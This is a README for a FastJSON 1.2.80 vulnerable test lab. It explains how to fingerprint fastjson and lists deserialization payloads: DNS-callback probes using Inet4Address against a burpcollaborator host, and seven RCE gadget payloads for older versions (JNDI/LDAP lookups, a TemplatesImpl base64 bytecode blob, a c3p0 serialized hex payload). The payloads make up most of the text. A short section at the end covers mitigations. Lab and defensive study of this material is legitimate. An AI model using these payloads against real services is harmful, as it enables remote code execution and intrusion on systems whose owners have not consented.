##  FastJSON-1.2.80-test-lab
 
* Run application using docker

```
docker build --network=host --no-cache .
```

## How to know if the targert application is using **fastjson**?

- Send Invalid JSON data and application will return 400 response exposing fastjson use in error message this technique only works if application  is not sending default error page.

```json
{"test":"nonexistent"
```
<img src="/screenshot/invalid-json-400-response.png">

## Exploit Payload

Use Following payload to receive DNS request from the vulnerable application.

```
{"test": {
"@type":"java.net.Inet4Address",
"val": "asdfasdfasdf.burpcollaborator.net"
}
```
<img src="/screenshot/ssrf-payload.png">

## Payload that I found working on fastJSON version 1.2.80 with AutType support enabled

You will receive DNS request.

```
{"a":{"@type":"java.net.Inet4Address","val":"5hnrph85wz9ve7dgl1gnawnhv810pp.burpcollaborator.net"}}
```
```
{"a":{"@type":"java.net.Inet6Address","val":"5hnrph85wz9ve7dgl1gnawnhv810pp.burpcollaborator.net"}}
```

## Payloads for RCE in other older versions

**source:** https://medium.com/@knownsec404team/fastjson-deserialization-vulnerability-history-5206714ceed1

```
payload1:
{
  "rand1": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://localhost:1389/Object",
    "autoCommit": true
  }
}
payload2:
{
  "rand1": {
    "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "_bytecodes": [
      "yv66vgAAADQAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAARBYUFhAQAMSW5uZXJDbGFzc2VzAQAdTGNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMkQWFBYTsBAApTb3VyY2VGaWxlAQAKVGVzdDMuamF2YQwABAAFBwATAQAbY29tL2xvbmdvZm8vdGVzdC9UZXN0MyRBYUFhAQAQamF2YS9sYW5nL09iamVjdAEAFmNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAVAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAFwAYCgAWABkBAARjYWxjCAAbAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAHQAeCgAWAB8BABNBYUFhNzQ3MTA3MjUwMjU3NTQyAQAVTEFhQWE3NDcxMDcyNTAyNTc1NDI7AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAIwoAJAAPACEAAgAkAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ACWxAAAAAgAHAAAABgABAAAAHAAIAAAADAABAAAABQAJACIAAAAIABQABQABAAYAAAAWAAIAAAAAAAq4ABoSHLYAIFexAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ"
    ],
    "_name": "aaa",
    "_tfactory": {},
    "_outputProperties": {}
  }
}
payload3:
{
  "rand1": {
    "@type": "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
    "properties": {
      "data_source": "ldap://localhost:1389/Object"
    }
  }
}
payload4:
{
  "rand1": {
    "@type": "org.springframework.beans.factory.config.PropertyPathFactoryBean",
    "targetBeanName": "ldap://localhost:1389/Object",
    "propertyPath": "foo",
    "beanFactory": {
      "@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
      "shareableResources": [
        "ldap://localhost:1389/Object"
      ]
    }
  }
}
payload5:
{
  "rand1": Set[
  {
    "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor",
    "beanFactory": {
      "@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
      "shareableResources": [
        "ldap://localhost:1389/obj"
      ]
    },
    "adviceBeanName": "ldap://localhost:1389/obj"
  },
  {
    "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor"
  }
]}
payload6:
{
  "rand1": {
    "@type": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
    "userOverridesAsString": "HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383038302f740003466f6f;"
  }
}
payload7:
{
  "rand1": {
    "@type": "com.mchange.v2.c3p0.JndiRefForwardingDataSource",
    "jndiName": "ldap://localhost:1389/Object",
    "loginTimeout": 0
  }
}

```

## How to protect against this attack

- Follow advisory released by the vendor https://github.com/alibaba/fastjson/wiki/security_update_20220523
- Enabling safeMode in fastjson which completely disables autoType,
- If you for some reason cannot make changes in the code instantly and need some time in that case you can configure firewall to block all requests that contains <b>@type</b> in request body because fastjson automatically map the value of key: value of json to the class corresponding to <b>@type</b>.


Credits:
https://github.com/vulhub/vulhub/tree/master/fastjson

